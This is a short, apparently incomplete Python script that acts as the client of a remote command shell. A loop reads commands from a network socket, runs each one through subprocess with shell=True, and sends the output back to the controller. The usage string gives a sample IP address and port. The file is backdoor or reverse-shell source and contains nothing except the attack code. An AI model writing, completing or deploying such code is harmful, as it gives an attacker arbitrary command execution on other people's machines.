import subprocess
import socket
import argparse


def usage():
    print("Examples: v_client.py -a 192.168.0.43 -p 9999 ")
    exit(0)


def execute_commmand(cmd):
    cmd = cmd.rstrip()

    try:
        results = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        results = "Could not execute commnad: " + cmd
    return results


def receive_data(client):
    try:
        while True:
            recieved_cmd = ""
            recieved_cmd += client.recv(4096)

            if not recieved_cmd:
                continue
            cmd_results = execute_commmand(recieved_cmd)
            client.send(cmd_results)
    except Exception as e:
        print("\n[-] Error:\n" + str(e))
        pass
